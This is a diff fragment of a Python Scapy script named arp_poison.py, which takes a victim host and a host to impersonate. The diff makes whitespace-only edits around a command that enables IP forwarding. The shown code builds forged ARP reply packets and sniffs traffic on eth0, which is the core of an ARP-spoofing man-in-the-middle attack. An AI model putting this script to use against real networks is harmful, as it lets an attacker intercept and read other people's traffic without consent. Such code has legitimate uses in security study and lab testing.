@@ -3,12 +3,13 @@
 from scapy.all import *
 import sys
 
-
 if len(sys.argv) != 3:
     print "Usage: arp_poison.py HOST_TO_ATTACK HOST_TO_IMPERSONATE"
     sys.exit(1)
 
+
 os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+
 
 victim_packet = ARP()
 victim_packet.op = 2
@@ -26,3 +27,5 @@ while True:
         sniff(iface=("eth0"), count=1, prn=lambda x: x.summary())
     except KeyboardInterrupt:
         break
+
+
